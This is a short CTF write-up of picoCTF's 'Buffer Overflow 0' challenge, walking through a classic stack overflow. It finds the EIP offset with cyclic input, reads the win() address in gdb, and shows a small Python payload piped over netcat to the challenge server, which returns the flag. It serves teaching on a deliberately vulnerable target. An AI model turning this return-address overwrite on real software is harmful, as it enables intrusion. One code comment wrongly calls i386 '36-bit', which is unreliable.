# Buffer Overflow 0
This was a CTF challenge using a simple BOF vulnerability to redirect a flag. 

## The Challenge
Author: Alex Fulton / Palash Oswal
Description
Smash the stack Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here. And connect with it using: `nc saturn.picoctf.net 51110`

## The Solution
It is similar albeit a little easier to [this](https://github.com/stangeqwq/CTF/blob/main/UiTHack23/Mp3%20player.md). By inputting cyclic characters, we get information on the offset of `eip`. Note that depending on your computer architecture, you might need to adjust to `i386` architecture to execute the binary. 
```console
┌──(ericjoshua㉿kali)-[~/Downloads]
└─$ nc saturn.picoctf.net 55885                     
Please enter your string: 
aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqq
Okay, time to return... Fingers Crossed... Jumping to 0x6c6c6c6c
```
`0x6c6c6c6c` is `llll` in ascii which suggests an offset of `40`. To find the address of the `win()` function, you can open up `gdb` and `disassemble win`. Doing so gives you the address of `0x080491f6`. The script I used was simple:
```python
offset = 40
eip_win = b"\xF6\x91\x04\x08" #0x080491f6 (little-endian 36-bit i386)
print(b'A'*offset + eip_win)
```console
──(ericjoshua㉿kali)-[~/Downloads]
└─$ python3 exploit.py | nc saturn.picoctf.net 51110
Input: picoCTF{ov3rfl0ws_ar3nt_that_bad_8ba275ff}
```

The flag is `picoCTF{ov3rfl0ws_ar3nt_that_bad_8ba275ff}`

